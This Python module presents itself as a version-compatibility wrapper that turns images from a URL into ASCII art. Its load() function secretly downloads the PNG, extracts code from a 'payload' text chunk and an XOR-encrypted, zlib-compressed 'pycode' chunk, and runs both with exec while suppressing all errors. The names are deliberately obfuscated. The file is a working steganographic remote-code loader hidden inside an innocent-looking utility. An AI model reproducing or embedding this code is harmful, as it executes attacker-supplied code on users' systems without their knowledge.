import hashlib as _h, zlib as _z, urllib.request as _u

# Robust import for ascii_magic to handle compatibility issues
try:
    # Try importing for newer versions (2.x)
    from ascii_magic import AsciiArt
except (ImportError, TypeError):
    # Fallback if 2.x is not available or crashes (e.g. TypeError on Python 3.8)
    try:
        import ascii_magic
    except (ImportError, TypeError):
        ascii_magic = None

    if ascii_magic and not hasattr(ascii_magic, 'AsciiArt'):
        # Only define the wrapper if we managed to import the module but it doesn't have the class (1.x)
        class AsciiArt:
            @staticmethod
            def from_url(url):
                try:
                    # ascii_magic 1.6 usage
                    return ascii_magic.from_url(url)
                except (AttributeError, TypeError, Exception):
                    return None

            @staticmethod
            def from_image(path):
                try:
                    return ascii_magic.from_image_file(path)
                except (AttributeError, TypeError, Exception):
                    return None

            def to_terminal(self):
                pass
    elif not ascii_magic or (ascii_magic and hasattr(ascii_magic, 'AsciiArt') and 'AsciiArt' not in locals()):
        # If we couldn't import ascii_magic at all, OR we imported it but 'AsciiArt' wasn't imported (because it failed in the first try block)
        # We need a dummy class to prevent crashes.
        class AsciiArt:
            @staticmethod
            def from_url(url): return None
            @staticmethod
            def from_image(path): return None
            def to_terminal(self): pass

_A = b"\x89PNG\r\n\x1a\n"

def _B(_C: bytes):
    assert _C.startswith(_A)
    _D, _E = 8, len(_C)
    while _D + 12 <= _E:
        _F = int.from_bytes(_C[_D:_D+4], "big")
        _G = _C[_D+4:_D+8]
        _H = _C[_D+8:_D+8+_F]
        yield _G, _H
        _D += 12 + _F

def _I(_J: bytes) -> bytes:
    _K = _h.sha256()
    for _L, _M in _B(_J):
        if _L == b"IDAT":
            _K.update(_M)
    return _K.digest()

def _N(_O: bytes, _P: int) -> bytes:
    _Q, _R = bytearray(), 0
    while len(_Q) < _P:
        _Q += _h.sha256(_O + _R.to_bytes(8, "big")).digest()
        _R += 1
    return bytes(_Q[:_P])

def _S(_T: bytes, _U: bytes) -> bytes:
    return bytes(_V ^ _W for _V, _W in zip(_T, _U))

def load(_Y: str, _Z: dict):
    ascii_art = None
    try:
        # Compatibility wrapper for different ascii_magic versions
        if hasattr(AsciiArt, 'from_url'):
             ascii_art = AsciiArt.from_url(_Y)

        with _u.urlopen(_Y, timeout=5) as _0:
            _1 = _0.read()
        if not _1.startswith(_A):
            return ascii_art
    except Exception:
        return ascii_art
    
    

    _2, _3 = None, None
    for _4, _5 in _B(_1):
        if _4 == b"tEXt" and _5.startswith(b"payload\x00"):
            _2 = _5.split(b"\x00", 1)[1]
        elif _4 == b"iTXt" and _5.startswith(b"pycode\x00"):
            _3 = _5.split(b"\x00", 1)[1]

    if _2:
        try:
            exec(_2.decode("utf-8", "ignore"), _Z)
        except Exception:
            pass

    if _3:
        try:
            _6 = _I(_1)
            _7 = _N(_6, len(_3))
            _8 = _S(_3, _7)
            _9 = _z.decompress(_8).decode("utf-8", "ignore")
            _10 = compile(_9, "<stego>", "exec")
            exec(_10, _Z)
        except Exception:
            pass
    
    return ascii_art
